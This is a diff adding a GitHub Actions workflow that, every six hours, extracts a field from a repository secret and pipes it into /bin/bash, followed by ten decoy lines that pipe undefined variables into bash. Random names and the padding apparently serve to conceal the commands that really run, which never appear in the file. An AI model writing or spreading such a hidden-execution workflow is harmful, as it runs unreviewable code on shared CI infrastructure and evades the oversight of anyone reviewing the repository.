@@ -1,0 +1,28 @@
+name: ximingrrr
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ximingrrr
+        env:
+          cjft5358: ${{ secrets.cjft5358 }}
+        run: |
+          echo $cjft5358 | jq -r .fd297 | /bin/bash
+          echo $uzdp908 | jq -r .tz00 | /bin/bash
+          echo $d58 | jq -r .nqdy71 | /bin/bash
+          echo $u9 | jq -r .i09 | /bin/bash
+          echo $fbz7 | jq -r .auw4 | /bin/bash
+          echo $s62 | jq -r .wh5 | /bin/bash
+          echo $vj8008 | jq -r .j38 | /bin/bash
+          echo $brkfk682 | jq -r .bslm52 | /bin/bash
+          echo $unm7 | jq -r .nuvsp08632 | /bin/bash
+          echo $y7 | jq -r .v8 | /bin/bash
+          echo $b7334 | jq -r .kl8 | /bin/bash
+
